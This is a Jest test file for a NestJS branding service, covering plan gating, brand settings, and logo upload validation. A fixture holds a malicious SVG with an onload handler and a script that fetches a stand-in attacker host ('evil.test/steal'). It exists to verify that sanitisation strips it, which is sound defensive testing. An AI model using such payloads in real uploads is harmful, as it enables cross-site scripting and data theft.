import { BadRequestException, ForbiddenException, NotFoundException } from '@nestjs/common';
import { BrandFont, Plan } from '@repo/db';
import { BrandingService } from './branding.service';
import { MESSAGES } from '../common/messages';

type Row = {
  id: string;
  brandColor: string | null;
  brandFont: BrandFont | null;
  brandLogoUrl: string | null;
  plan: Plan;
};

function makeService(user: Partial<Row> | null) {
  const row: Row | null = user
    ? { id: 'u1', brandColor: null, brandFont: null, brandLogoUrl: null, plan: Plan.FREE, ...user }
    : null;

  const update = jest.fn(async ({ data }: { data: Partial<Row> }) => {
    Object.assign(row as Row, data);
    return row;
  });
  const prisma = {
    user: {
      findUnique: jest.fn(async () => row),
      update,
    },
  };

  // In-memory storage stub keyed exactly like StorageService.
  const objects = new Map<string, Buffer>();
  const storage = {
    buildBrandingLogoKey: (id: string) => `branding/${id}/logo`,
    save: jest.fn(async (key: string, data: Buffer) => {
      objects.set(key, data);
    }),
    read: jest.fn(async (key: string) => {
      const v = objects.get(key);
      if (!v) throw new Error('not found');
      return v;
    }),
  };
  const config = { get: jest.fn((k: string) => (k === 'API_PUBLIC_URL' ? 'https://api.example.com' : undefined)) };

  const service = new BrandingService(prisma as never, storage as never, config as never);
  return { service, prisma, update, storage, objects, getRow: () => row };
}

// A 1×1 PNG (valid magic) and a minimal valid JPEG header for upload tests.
const PNG_BYTES = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
const SVG_OK = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>');
const SVG_EVIL = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' +
    '<script>fetch("//evil.test/steal")</script>' +
    '<image href="http://evil.test/x.png"/>' +
    '<rect width="10" height="10"/></svg>',
);

function logoFile(buffer: Buffer, originalname: string, mimetype: string) {
  return { buffer, originalname, mimetype, size: buffer.length };
}

describe('BrandingService.get', () => {
  it('returns current branding with plan eligibility (FREE → disabled)', async () => {
    const { service } = makeService({
      brandColor: '#4F46E5',
      brandFont: BrandFont.SERIF,
      brandLogoUrl: 'logo/key.png',
      plan: Plan.FREE,
    });
    await expect(service.get('u1')).resolves.toEqual({
      brandColor: '#4F46E5',
      brandFont: BrandFont.SERIF,
      logoUrl: 'logo/key.png',
      brandingEnabled: false,
    });
  });

  it('reports brandingEnabled for paid plans', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    await expect(service.get('u1')).resolves.toMatchObject({ brandingEnabled: true });
  });

  it('throws when the user is missing', async () => {
    const { service } = makeService(null);
    await expect(service.get('ghost')).rejects.toBeInstanceOf(NotFoundException);
  });
});

describe('BrandingService.update', () => {
  it('rejects FREE plan with the upgrade copy (403) and writes nothing', async () => {
    const { service, update } = makeService({ plan: Plan.FREE });
    await expect(service.update('u1', { brandColor: '#123456' })).rejects.toMatchObject({
      message: MESSAGES.branding.upgradeRequired,
    });
    await expect(service.update('u1', { brandColor: '#123456' })).rejects.toBeInstanceOf(
      ForbiddenException,
    );
    expect(update).not.toHaveBeenCalled();
  });

  it('persists color and font for PRO and echoes the updated view', async () => {
    const { service, update, getRow } = makeService({ plan: Plan.PRO });
    const result = await service.update('u1', {
      brandColor: '#0A0A0A',
      brandFont: BrandFont.SCRIPT,
    });
    expect(update).toHaveBeenCalledWith({
      where: { id: 'u1' },
      data: { brandColor: '#0A0A0A', brandFont: BrandFont.SCRIPT },
    });
    expect(getRow()).toMatchObject({ brandColor: '#0A0A0A', brandFont: BrandFont.SCRIPT });
    expect(result).toMatchObject({
      brandColor: '#0A0A0A',
      brandFont: BrandFont.SCRIPT,
      brandingEnabled: true,
    });
  });

  it('also enables ENTERPRISE', async () => {
    const { service, update } = makeService({ plan: Plan.ENTERPRISE });
    await service.update('u1', { brandFont: BrandFont.SANS });
    expect(update).toHaveBeenCalledTimes(1);
  });

  it('writes only the fields supplied (undefined is left untouched)', async () => {
    const { service, update } = makeService({
      plan: Plan.PRO,
      brandColor: '#abcdef',
      brandFont: BrandFont.SANS,
    });
    await service.update('u1', { brandColor: '#654321' });
    expect(update).toHaveBeenCalledWith({
      where: { id: 'u1' },
      data: { brandColor: '#654321' },
    });
    // brandFont key absent → existing value preserved.
    expect(update.mock.calls[0][0].data).not.toHaveProperty('brandFont');
  });

  it('clears a field when passed null', async () => {
    const { service, update } = makeService({ plan: Plan.PRO, brandColor: '#abcdef' });
    await service.update('u1', { brandColor: null });
    expect(update).toHaveBeenCalledWith({
      where: { id: 'u1' },
      data: { brandColor: null },
    });
  });
});

describe('BrandingService.uploadLogo', () => {
  it('rejects FREE plan with the upgrade copy (403) and stores nothing', async () => {
    const { service, storage } = makeService({ plan: Plan.FREE });
    await expect(
      service.uploadLogo('u1', logoFile(PNG_BYTES, 'logo.png', 'image/png')),
    ).rejects.toBeInstanceOf(ForbiddenException);
    expect(storage.save).not.toHaveBeenCalled();
  });

  it('rejects a disallowed format with the branding copy (400)', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    const gif = logoFile(Buffer.from('GIF89a....'), 'logo.gif', 'image/gif');
    await expect(service.uploadLogo('u1', gif)).rejects.toBeInstanceOf(BadRequestException);
    await expect(service.uploadLogo('u1', gif)).rejects.toMatchObject({
      message: MESSAGES.branding.logoFormat,
    });
  });

  it('rejects a mime/extension/content mismatch (script renamed .png)', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    const fake = logoFile(Buffer.from('<script>alert(1)</script>'), 'logo.png', 'image/png');
    await expect(service.uploadLogo('u1', fake)).rejects.toMatchObject({
      message: MESSAGES.branding.logoFormat,
    });
  });

  it('rejects an oversize file with the size copy (400)', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    const big = { ...logoFile(PNG_BYTES, 'logo.png', 'image/png'), size: 3 * 1024 * 1024 };
    await expect(service.uploadLogo('u1', big)).rejects.toMatchObject({
      message: MESSAGES.branding.logoTooLarge,
    });
  });

  it('rejects an empty file with the empty copy (400)', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    const empty = logoFile(Buffer.alloc(0), 'logo.png', 'image/png');
    await expect(service.uploadLogo('u1', empty)).rejects.toMatchObject({
      message: MESSAGES.branding.logoEmpty,
    });
  });

  it('stores a valid PNG and points brandLogoUrl at the public URL', async () => {
    const { service, storage, getRow } = makeService({ plan: Plan.PRO });
    const view = await service.uploadLogo('u1', logoFile(PNG_BYTES, 'logo.png', 'image/png'));
    expect(storage.save).toHaveBeenCalledWith('branding/u1/logo', PNG_BYTES);
    expect(getRow()?.brandLogoUrl).toMatch(
      /^https:\/\/api\.example\.com\/api\/branding\/u1\/logo\?v=[0-9a-f]{12}$/,
    );
    expect(view.logoUrl).toBe(getRow()?.brandLogoUrl);
  });

  it('SECURITY: sanitizes a malicious SVG before storing it', async () => {
    const { service, objects } = makeService({ plan: Plan.PRO });
    await service.uploadLogo('u1', logoFile(SVG_EVIL, 'logo.svg', 'image/svg+xml'));
    const stored = objects.get('branding/u1/logo')!.toString('utf8');
    expect(stored).not.toMatch(/<script/i);
    expect(stored).not.toMatch(/onload/i);
    expect(stored).not.toMatch(/evil\.test/i);
    // The benign drawing survives.
    expect(stored).toMatch(/<rect/i);
  });

  it('stores a clean SVG and serves it with the svg content-type', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    await service.uploadLogo('u1', logoFile(SVG_OK, 'logo.svg', 'image/svg+xml'));
    const served = await service.serveLogo('u1');
    expect(served.contentType).toBe('image/svg+xml');
    expect(served.isSvg).toBe(true);
  });
});

describe('BrandingService.serveLogo', () => {
  it('serves a stored PNG with the correct content-type (public, no gate)', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    await service.uploadLogo('u1', logoFile(PNG_BYTES, 'logo.png', 'image/png'));
    const served = await service.serveLogo('u1');
    expect(served.contentType).toBe('image/png');
    expect(served.isSvg).toBe(false);
    expect(served.buffer).toEqual(PNG_BYTES);
  });

  it('throws NotFound when no logo is stored', async () => {
    const { service } = makeService({ plan: Plan.PRO });
    await expect(service.serveLogo('ghost')).rejects.toBeInstanceOf(NotFoundException);
  });
});

describe('BrandingService.removeLogo', () => {
  it('rejects FREE plan (403)', async () => {
    const { service } = makeService({ plan: Plan.FREE, brandLogoUrl: 'x' });
    await expect(service.removeLogo('u1')).rejects.toBeInstanceOf(ForbiddenException);
  });

  it('clears brandLogoUrl for an eligible sender', async () => {
    const { service, update, getRow } = makeService({
      plan: Plan.PRO,
      brandLogoUrl: 'https://api.example.com/api/branding/u1/logo?v=abc',
    });
    await service.removeLogo('u1');
    expect(update).toHaveBeenCalledWith({ where: { id: 'u1' }, data: { brandLogoUrl: null } });
    expect(getRow()?.brandLogoUrl).toBeNull();
  });
});
